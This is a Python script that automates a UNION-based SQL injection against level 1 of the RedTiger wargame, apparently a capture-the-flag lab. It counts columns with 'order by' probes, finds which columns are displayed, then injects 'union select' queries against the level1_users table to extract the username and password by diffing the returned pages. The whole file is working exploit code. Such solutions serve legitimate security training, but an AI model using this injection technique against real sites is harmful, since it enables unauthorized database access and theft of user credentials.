#!/usr/bin/env python3
import requests
from requests.exceptions import HTTPError
import difflib


def get_request(url: str, param: dict) -> str:
    try:
        response = requests.get(url, params=param)
        response.raise_for_status()
    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')
    else:
        return response.text


def count_columns(url: str) -> int:
    max_columns = 10
    for i in range(1, max_columns):
        param = dict(cat=f"1 order by {i}")
        html = get_request(url, param)
        if 'cool' not in html:
            return i - 1
    return 0


def find_visible_columns(url: str, base_name: str,
                         list_of_columns: list) -> list:
    list_of_visible = []
    param = dict(
        cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
    html = get_request(url, param)
    for i in list_of_columns:
        if '<b>' + i in html or '<br>' + i in html:
            list_of_visible.append(i)
    return [list_of_visible, html]


def find_param(url: str, base_name: str, list_of_columns: list,
               list_of_visible: list, find: list, html_visible: str) -> list:
    if len(find) <= len(list_of_visible):
        for f in range(len(find)):
            list_of_columns[int(list_of_visible[f]) - 1] = find[f]
        param = dict(
            cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
        html = get_request(url, param)
        # find differens
        n = -1
        key = [''] * len(find)
        for i, s in enumerate(difflib.ndiff(html, html_visible)):
            if s[0] == ' ':
                continue
            elif s[0] == '-':
                key[n] += s[-1]
            elif s[0] == '+':
                n += 1
        return key
    else:
        # todo
        print('too small visible list')
        exit(1)


def main():
    url = "https://redtiger.labs.overthewire.org/level1.php"
    base_name = 'level1_users'
    finds = ['username', 'password']  # what we are finding
    columns = count_columns(url)
    if not columns:
        print('num of columns not find')
        exit(1)
    list_of_columns = [str(c + 1) for c in range(columns)]
    list_of_visible, html_visible = find_visible_columns(
        url, base_name, list_of_columns)
    if not list_of_visible:
        print('not find visible column')
        exit(1)
    keys = find_param(url, base_name, list_of_columns,
                      list_of_visible, finds, html_visible)
    print(keys)


if __name__ == '__main__':
    main()
